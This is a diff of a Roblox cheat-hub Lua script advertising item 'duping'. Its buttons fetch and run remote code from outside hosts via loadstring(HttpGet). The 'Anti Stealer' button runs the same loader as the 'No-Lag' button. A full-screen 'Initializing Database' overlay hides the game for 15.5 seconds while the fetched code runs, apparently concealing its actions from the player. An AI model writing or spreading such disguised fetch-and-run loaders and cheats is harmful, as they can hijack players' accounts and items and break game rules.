@@ -1,170 +1,141 @@
 debugX = true
 
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+-- First create the initialization screen function
+local function showInitializationScreen()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "InitializationDisplay"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
 
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Name = "InitializationText"
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.Position = UDim2.new(0, 0, 0, 0)
+    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+    textLabel.TextColor3 = Color3.new(0, 1, 0)
+    textLabel.Font = Enum.Font.Code
+    textLabel.TextSize = 36
+    textLabel.Text = "PLS WAIT Initializing Database..."
+    textLabel.TextScaled = false
+    textLabel.TextWrapped = true
+    textLabel.TextXAlignment = Enum.TextXAlignment.Center
+    textLabel.TextYAlignment = Enum.TextYAlignment.Center
+    textLabel.Parent = screenGui
+
+    -- Color cycling coroutine
+    coroutine.wrap(function()
+        local hue = 0
+        while true do
+            hue = (hue + 0.01) % 1
+            textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
+            local dots = string.rep(".", math.floor((tick() % 3) + 1))
+            textLabel.Text = "PLS WAIT Initializing Database" .. dots
+            task.wait(0.1)
+        end
+    end)()
+    
+    return screenGui
+end
+
+-- Show initialization screen while loading Rayfield
+local initScreen = showInitializationScreen()
+
+-- Load Rayfield with error handling
+local Rayfield, rayfieldError = pcall(function()
+    return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+end)
+
+if not Rayfield or rayfieldError then
+    initScreen:Destroy()
+    warn("Failed to load Rayfield:", rayfieldError)
+    return
+end
+
+-- Now create the window
 local Window = Rayfield:CreateWindow({
    Name = "7xxx HUB",
-   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "7xxx Interface Suite",
    LoadingSubtitle = "by 7xxx Duping #GAG",
-   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
-
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
-
    ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil, -- Create a custom folder for your hub/game
-      FileName = "Big Hub"
+      Enabled = false,
    },
-
    Discord = {
-      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
-      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+      Enabled = true,
+      Invite = "2pKgPGNm",
+      RememberJoins = false
    },
-
-   KeySystem = false, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Untitled",
-      Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
-      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
-   }
+   KeySystem = false,
 })
 
-local Tab = Window:CreateTab("Tab Example", 4483362458) -- Title, Image
+-- Remove initialization screen after Rayfield loads
+initScreen:Destroy()
 
-local Section = Tab:CreateSection("Section Example")
+-- Create tabs and buttons
+local Tab = Window:CreateTab("Script Tab", 4483362458)
+local Section = Tab:CreateSection("Keyless Script Selection")
 
-local Button = Tab:CreateButton({
+Tab:CreateButton({
     Name = "No-Lag Script",
     Callback = function()
-        local gui = Instance.new("ScreenGui")
-        gui.IgnoreGuiInset = true
-        gui.ResetOnSpawn = false
-        gui.Name = "ServerHoppingOverlay"
-        gui.Parent = game:GetService("CoreGui")
-
-        -- Create black background
-        local background = Instance.new("Frame")
-        background.Size = UDim2.new(1, 0, 1, 0)
-        background.Position = UDim2.new(0, 0, 0, 0)
-        background.BackgroundColor3 = Color3.new(0, 0, 0)
-        background.BorderSizePixel = 0
-        background.Parent = gui
-
-        -- Create text label
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, 0, 1, 0)
-        text.Position = UDim2.new(0, 0, 0, 0)
-        text.BackgroundTransparency = 1
-        text.Text = "SERVER HOPPING PLS WAIT..."
-        text.TextColor3 = Color3.new(1, 1, 1)
-        text.TextStrokeTransparency = 0.7
-        text.TextScaled = true
-        text.Font = Enum.Font.SourceSansBold
-        text.Parent = gui
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
-        -- Create ScreenGui
-        local gui = Instance.new("ScreenGui")
-        gui.IgnoreGuiInset = true
-        gui.ResetOnSpawn = false
-        gui.Name = "ServerHoppingOverlay"
-        gui.Parent = game:GetService("CoreGui")
-
-        -- Create black background
-        local background = Instance.new("Frame")
-        background.Size = UDim2.new(1, 0, 1, 0)
-        background.Position = UDim2.new(0, 0, 0, 0)
-        background.BackgroundColor3 = Color3.new(0, 0, 0)
-        background.BorderSizePixel = 0
-        background.Parent = gui
-
-        -- Create text label
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, 0, 1, 0)
-        text.Position = UDim2.new(0, 0, 0, 0)
-        text.BackgroundTransparency = 1
-        text.Text = "SERVER HOPPING PLS WAIT..."
-        text.TextColor3 = Color3.new(1, 1, 1)
-        text.TextStrokeTransparency = 0.7
-        text.TextScaled = true
-        text.Font = Enum.Font.SourceSansBold
-        text.Parent = gui
-
-        -- Optional: Wait a second before executing the script (for effect)
-        task.wait(1.5)
-
-        -- Load the external No-Lag script
-        
+        local loadingScreen = showInitializationScreen()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/main/Loader/LoaderV1.lua", true))()
+        end)
+        task.wait(15.5)
+        loadingScreen:Destroy()
+        if not success then
+            warn("Failed to load No-Lag Script:", err)
+        end
     end,
 })
 
-local Button = Tab:CreateButton({
-    Name = "DUPE Script",
+Tab:CreateButton({
+    Name = "Anti Stealer",
     Callback = function()
-        local gui = Instance.new("ScreenGui")
-        gui.IgnoreGuiInset = true
-        gui.ResetOnSpawn = false
-        gui.Name = "ServerHoppingOverlay"
-        gui.Parent = game:GetService("CoreGui")
+        local loadingScreen = showInitializationScreen()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/main/Loader/LoaderV1.lua", true))()
+        end)
+        task.wait(15.5)
+        loadingScreen:Destroy()
+        if not success then
+            warn("Failed to load Anti Stealer:", err)
+        end
+    end,
+})
 
-        -- Create black background
-        local background = Instance.new("Frame")
-        background.Size = UDim2.new(1, 0, 1, 0)
-        background.Position = UDim2.new(0, 0, 0, 0)
-        background.BackgroundColor3 = Color3.new(0, 0, 0)
-        background.BorderSizePixel = 0
-        background.Parent = gui
+local Tab1 = Window:CreateTab("Premium Scripts", 4483362458)
+local Section1 = Tab1:CreateSection("Key Script Selection")
 
-        -- Create text label
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, 0, 1, 0)
-        text.Position = UDim2.new(0, 0, 0, 0)
-        text.BackgroundTransparency = 1
-        text.Text = "PLS WAIT..."
-        text.TextColor3 = Color3.new(1, 1, 1)
-        text.TextStrokeTransparency = 0.7
-        text.TextScaled = true
-        text.Font = Enum.Font.SourceSansBold
-        text.Parent = gui
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
-        -- Create ScreenGui
-        local gui = Instance.new("ScreenGui")
-        gui.IgnoreGuiInset = true
-        gui.ResetOnSpawn = false
-        gui.Name = "ServerHoppingOverlay"
-        gui.Parent = game:GetService("CoreGui")
+Tab1:CreateButton({
+    Name = "Lunor Script",
+    Callback = function()
+        local loadingScreen = showInitializationScreen()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://lunor.dev/loader", true))()
+        end)
+        task.wait(15.5)
+        loadingScreen:Destroy()
+        if not success then
+            warn("Failed to load Lunor Script:", err)
+        end
+    end,
+})
 
-        -- Create black background
-        local background = Instance.new("Frame")
-        background.Size = UDim2.new(1, 0, 1, 0)
-        background.Position = UDim2.new(0, 0, 0, 0)
-        background.BackgroundColor3 = Color3.new(0, 0, 0)
-        background.BorderSizePixel = 0
-        background.Parent = gui
-
-        -- Create text label
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, 0, 1, 0)
-        text.Position = UDim2.new(0, 0, 0, 0)
-        text.BackgroundTransparency = 1
-        text.Text = "PLS WAIT..."
-        text.TextColor3 = Color3.new(1, 1, 1)
-        text.TextStrokeTransparency = 0.7
-        text.TextScaled = true
-        text.Font = Enum.Font.SourceSansBold
-        text.Parent = gui
-
-        -- Optional: Wait a second before executing the script (for effect)
-        task.wait(1.5)
-
-        -- Load the external No-Lag script
-        
+Tab1:CreateButton({
+    Name = "Lumin Script",
+    Callback = function()
+        local loadingScreen = showInitializationScreen()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua", true))()
+        end)
+        task.wait(15.5)
+        loadingScreen:Destroy()
+        if not success then
+            warn("Failed to load Lumin Script:", err)
+        end
     end,
 })
 
